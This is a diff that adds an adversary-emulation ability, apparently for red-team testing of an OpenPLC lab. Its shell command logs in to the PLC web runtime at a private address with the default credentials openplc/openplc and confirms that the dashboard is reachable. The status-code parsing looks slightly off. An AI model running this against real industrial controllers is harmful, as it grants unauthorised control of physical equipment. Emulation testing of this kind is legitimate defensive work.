@@ -1,0 +1,24 @@
+---
+
+- id: b2c3d4e5-2222-2222-2222-000000000001
+  name: OpenPLC - Default Credential Access
+  description: Login to OpenPLC web runtime with default credentials
+  tactic: credential-access
+  technique_id: T0812
+  technique_name: Default Credentials
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      curl -s -c /tmp/plc_cookies.txt
+      -d "username=openplc&password=openplc"
+      "http://192.168.95.2:8080/login"
+      -o /tmp/plc_login.html -w "%{http_code}" &&
+      HTTP=$(tail -c 3 /tmp/plc_login.html) &&
+      echo "HTTP_STATUS: $HTTP" &&
+      curl -s -b /tmp/plc_cookies.txt
+      "http://192.168.95.2:8080/dashboard"
+      -o /tmp/plc_dash.html &&
+      grep -qi "running\|dashboard\|programs" /tmp/plc_dash.html &&
+      echo "LOGIN_SUCCESS" || echo "LOGIN_FAILED"
+    timeout: 60
